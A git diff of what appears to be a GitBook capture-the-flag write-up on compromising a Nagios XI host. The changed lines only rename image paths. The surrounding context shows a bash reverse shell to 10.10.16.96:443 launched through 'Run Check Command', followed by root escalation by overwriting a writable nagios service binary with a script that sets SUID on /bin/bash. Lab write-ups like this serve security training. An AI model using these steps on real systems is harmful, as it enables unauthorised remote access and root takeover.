@@ -350,18 +350,18 @@ bash -c 'bash -i &> /dev/tcp/10.10.16.96/443 0>&1'
 
 <figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Now navigate to <mark style="color:$success;">**Configure**</mark> -> <mark style="color:$success;">**Core Config Manager**</mark> -> <mark style="color:$success;">**Hosts**</mark>
 * click on <mark style="color:$success;">**localhost**</mark> -> select our shell command and click on <mark style="color:$success;">**Run Check Command**</mark>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 You should receive a shell on your listener
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## <mark style="color:$success;">Post Exploitation</mark>
 
@@ -369,11 +369,11 @@ You should receive a shell on your listener
 
 #### <mark style="color:$primary;">Manual Enumeration</mark>
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can run many commands as the root user. The first 11 commands are from `/etc/init.d` for the `nagios` and `npcd` binaries. None of these are present on the host
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The script that stands out to me is <mark style="color:$success;">**manager\_services.sh**</mark> let's check it out
 
@@ -432,7 +432,7 @@ We see at the end it runs systemctl or service
 
 <mark style="color:yellow;">**Via Linpeas**</mark>
 
-<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:yellow;">**Manually**</mark>
 
@@ -448,7 +448,7 @@ for service in "postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We have write access on the service file `/usr/local/nagios/bin/nagios` &#x20;
 
@@ -465,7 +465,7 @@ mv nagios nagios.bk
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I'll create a new nagios script that will set the SUID on bash, and make it writable
 
@@ -475,7 +475,7 @@ echo -e '#!/bin/bash\n\nchmod +s /bin/bash' > nagios
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now I'll restart the service and it should set the SUID on bash
 
